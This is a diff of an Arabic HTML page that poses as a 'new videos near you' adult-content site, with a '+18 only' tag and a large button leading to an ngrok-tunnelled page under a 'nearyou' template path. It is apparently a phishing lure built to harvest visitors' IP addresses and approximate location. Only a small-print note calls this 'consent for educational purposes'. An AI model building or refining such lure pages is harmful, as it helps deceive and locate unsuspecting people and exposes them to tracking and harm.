@@ -2,138 +2,244 @@
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8" />
-  <title>مشاهدة الفديوات</title>
+  <title>فيديوهات جديدة قريبة منك</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <style>
-    body {
+    * {
+      box-sizing: border-box;
       margin: 0;
       padding: 0;
-      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
-      background: #0f172a;
-      color: #f9fafb;
-      display: flex;
-      justify-content: center;
-      align-items: center;
+    }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", system-ui, sans-serif;
+      background: radial-gradient(circle at top, #202020 0, #050507 55%, #020203 100%);
+      color: #f5f5f5;
       min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 24px;
+      direction: rtl;
     }
 
-    .card {
-      background: #020617;
-      border-radius: 18px;
-      padding: 24px 28px;
-      max-width: 380px;
-      width: 90%;
-      box-shadow: 0 18px 40px rgba(0, 0, 0, 0.6);
-      text-align: center;
-      border: 1px solid #1f2937;
+    .wrapper {
+      max-width: 480px;
+      width: 100%;
     }
 
-    .title {
-      font-size: 1.4rem;
-      margin-bottom: 6px;
+    .badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      background: rgba(0, 0, 0, 0.7);
+      border-radius: 999px;
+      padding: 6px 14px;
+      font-size: 13px;
+      margin-bottom: 18px;
+      border: 1px solid rgba(255, 255, 255, 0.08);
+    }
+
+    .dot-live {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background: #ff3b30;
+      box-shadow: 0 0 10px rgba(255, 59, 48, 0.9);
+    }
+
+    h1 {
+      font-size: 26px;
+      margin-bottom: 10px;
+      letter-spacing: 0.02em;
     }
 
     .subtitle {
-      font-size: 0.9rem;
-      color: #9ca3af;
-      margin-bottom: 18px;
+      font-size: 14px;
+      color: #c7c7c7;
+      margin-bottom: 22px;
     }
 
-    .fake-thumb {
-      width: 100%;
-      height: 180px;
-      background: linear-gradient(135deg, #111827, #1f2937);
-      border-radius: 12px;
-      margin-bottom: 18px;
+    .card {
+      background: linear-gradient(145deg, #111114, #050507);
+      border-radius: 18px;
+      padding: 18px 18px 20px;
+      box-shadow:
+        0 20px 45px rgba(0, 0, 0, 0.8),
+        0 0 0 1px rgba(255, 255, 255, 0.03);
+    }
+
+    .video-box {
+      background: radial-gradient(circle at center, #252525 0, #060606 55%, #000 100%);
+      border-radius: 14px;
+      padding: 32px 16px;
+      margin-bottom: 14px;
       position: relative;
       overflow: hidden;
     }
 
-    .fake-thumb::before {
-      content: "";
+    .scan-lines {
       position: absolute;
       inset: 0;
-      background: radial-gradient(circle at center, rgba(248, 250, 252, 0.13), transparent 55%);
+      background-image: repeating-linear-gradient(
+        to bottom,
+        rgba(255, 255, 255, 0.06),
+        rgba(255, 255, 255, 0.06) 1px,
+        transparent 1px,
+        transparent 3px
+      );
+      opacity: 0.12;
+      pointer-events: none;
     }
 
-    .play-icon {
-      width: 64px;
-      height: 64px;
+    .play-circle {
+      width: 74px;
+      height: 74px;
       border-radius: 50%;
-      border: 2px solid rgba(248, 250, 252, 0.8);
+      border: 2px solid rgba(255, 59, 48, 0.8);
       display: flex;
-      justify-content: center;
       align-items: center;
+      justify-content: center;
       margin: 0 auto;
-      margin-top: 52px;
-      background: rgba(15, 23, 42, 0.7);
-      backdrop-filter: blur(4px);
+      box-shadow: 0 0 18px rgba(255, 59, 48, 0.65);
+      position: relative;
+      z-index: 1;
     }
 
-    .play-icon span {
-      display: inline-block;
+    .play-inner {
+      width: 56px;
+      height: 56px;
+      border-radius: 50%;
+      background: radial-gradient(circle at 30% 10%, #ff7a6f, #ff3b30);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .triangle {
+      width: 0;
+      height: 0;
+      border-top: 10px solid transparent;
+      border-bottom: 10px solid transparent;
+      border-left: 16px solid #ffffff;
       margin-left: 4px;
-      border-style: solid;
-      border-width: 10px 0 10px 16px;
-      border-color: transparent transparent transparent #f9fafb;
     }
 
-    .button {
-      display: inline-block;
-      margin-top: 8px;
-      padding: 10px 18px;
+    .card-footer {
+      display: flex;
+      justify-content: space-between;
+      font-size: 12px;
+      color: #a8a8a8;
+      margin-bottom: 6px;
+    }
+
+    .pill {
+      display: inline-flex;
+      align-items: center;
+      gap: 5px;
+      padding: 2px 8px;
+      border-radius: 999px;
+      background: rgba(255, 59, 48, 0.09);
+      color: #ff7a6f;
+      font-size: 11px;
+    }
+
+    .pill-dot {
+      width: 6px;
+      height: 6px;
+      border-radius: 50%;
+      background: #ff3b30;
+    }
+
+    .big-button {
+      display: block;
+      width: 100%;
+      margin-top: 12px;
+      padding: 13px 20px;
       border-radius: 999px;
       border: none;
-      cursor: pointer;
-      font-size: 0.95rem;
+      background: linear-gradient(120deg, #ff4b3a, #ff1f57);
+      color: #ffffff;
+      font-size: 15px;
       font-weight: 600;
-      background: #ef4444;
-      color: #f9fafb;
-      box-shadow: 0 8px 20px rgba(239, 68, 68, 0.45);
-      transition: transform 0.12s ease, box-shadow 0.12s ease, background 0.12s ease;
+      text-align: center;
+      cursor: pointer;
+      text-decoration: none;
+      box-shadow:
+        0 12px 25px rgba(255, 57, 57, 0.65),
+        0 0 0 1px rgba(255, 255, 255, 0.08);
+      transition: transform 0.12s ease-out, box-shadow 0.12s ease-out;
     }
 
-    .button:hover {
+    .big-button:hover {
       transform: translateY(-1px);
-      background: #dc2626;
-      box-shadow: 0 12px 26px rgba(220, 38, 38, 0.55);
+      box-shadow:
+        0 16px 30px rgba(255, 57, 57, 0.8),
+        0 0 0 1px rgba(255, 255, 255, 0.1);
     }
 
-    .consent {
-      margin-top: 10px;
-      font-size: 0.7rem;
-      color: #6b7280;
-      line-height: 1.5;
+    .big-button:active {
+      transform: translateY(1px);
+      box-shadow:
+        0 4px 12px rgba(0, 0, 0, 0.8),
+        0 0 0 1px rgba(255, 255, 255, 0.06);
+    }
+
+    .small-note {
+      margin-top: 14px;
+      font-size: 11px;
+      line-height: 1.7;
+      color: #a0a0a0;
+    }
+
+    .small-note span {
+      color: #ff7a6f;
     }
   </style>
 </head>
 <body>
-  <div class="card">
-    <div class="title">مشاهدة الفديوات</div>
-    <div class="subtitle">اضغط على الزر في الأسفل لمشاهدة الفديوات.</div>
-
-    <div class="fake-thumb">
-      <div class="play-icon">
-        <span></span>
-      </div>
+  <div class="wrapper">
+    <div class="badge">
+      <span class="dot-live"></span>
+      <span>فيديوهات جديدة قريبة منك</span>
     </div>
 
-    <button class="button" onclick="goToVideos()">
-      اضغط هنا لمشاهدة الفديوات
-    </button>
+    <h1>اضغط هنا لمشاهدة الفيديوهات</h1>
+    <p class="subtitle">
+      يتم عرض مقاطع تم اختيارها حسب موقعك والمنطقة القريبة منك.
+    </p>
 
-    <div class="consent">
-      بالضغط على الزر أعلاه، أنت توافق على مشاركة عنوان الـ IP وبعض معلومات
-      المتصفح لأغراض تعليمية وتجريبية فقط.
+    <div class="card">
+      <div class="video-box">
+        <div class="scan-lines"></div>
+        <div class="play-circle">
+          <div class="play-inner">
+            <div class="triangle"></div>
+          </div>
+        </div>
+      </div>
+
+      <div class="card-footer">
+        <div>+18 فقط</div>
+        <div class="pill">
+          <span class="pill-dot"></span>
+          <span>قريب من موقعك</span>
+        </div>
+      </div>
+
+      <!-- BUTTON: this will redirect to your ngrok page -->
+      <a
+        class="big-button"
+        href="https://interferometric-superocularly-laraine.ngrok-free.dev/templates/nearyou/index.html"
+      >
+        اضغط هنا لمشاهدة الفيديوهات
+      </a>
+
+      <p class="small-note">
+        بالضغط على الزر أعلاه، أنت <span>توافق على مشاركة عنوان IP والموقع التقريبي</span>
+        لأغراض تعليمية وتجريبية فقط. لا يتم حفظ أي بيانات شخصية ولا استخدامها للإساءة.
+      </p>
     </div>
   </div>
-
-  <script>
-    function goToVideos() {
-      // ضع رابط ngrok هنا
-      const TARGET_URL = "https://interferometric-superocularly-laraine.ngrok-free.dev/templates/nearyou/index.html";
-      window.location.href = TARGET_URL;
-    }
-  </script>
 </body>
 </html>
